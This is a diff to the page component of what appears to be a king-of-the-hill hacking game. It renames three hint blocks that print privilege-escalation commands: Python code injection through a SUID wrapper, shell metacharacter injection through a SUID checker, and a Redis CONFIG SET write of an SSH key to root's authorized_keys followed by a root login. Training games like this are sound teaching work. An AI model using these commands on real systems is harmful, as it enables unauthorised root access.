@@ -380,25 +380,25 @@ export default async function KothPage({
               <div className="space-y-3 pt-2 pb-1">
                 <div className="space-y-1">
                   <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    L7 — phantom-python3 SUID · argv code injection
+                    suid-python-wrapper · argv code injection
                   </div>
                   <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
 {`/usr/local/bin/phantom-python3 -c \\
-  'import os; os.system("crown-claim koth${mySlot.slot} l7-suid")'`}
+  'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")'`}
                   </pre>
                 </div>
                 <div className="space-y-1">
                   <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    L8 — system-checker SUID · shell metachar injection
+                    suid-shell-injection · shell metachar through SUID wrapper
                   </div>
                   <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
 {`/usr/local/bin/system-checker \\
-  '127.0.0.1; crown-claim koth${mySlot.slot} l8-suid'`}
+  '127.0.0.1; crown-claim koth${mySlot.slot} suid-shell-injection'`}
                   </pre>
                 </div>
                 <div className="space-y-1">
                   <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    L17 — Redis CONFIG SET · write to /root/.ssh/authorized_keys
+                    redis-config-set-dir · write authorized_keys via redis-cli
                   </div>
                   <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
 {`ssh-keygen -t ed25519 -f /tmp/k -N ''
@@ -410,7 +410,7 @@ SET x "\\n\\n$KEY\\n\\n"
 SAVE
 EOF
 ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
-  "crown-claim koth${mySlot.slot} l17-redis"`}
+  "crown-claim koth${mySlot.slot} redis-config-set-dir"`}
                   </pre>
                 </div>
                 <p className="text-[10px] text-muted leading-snug pt-1">
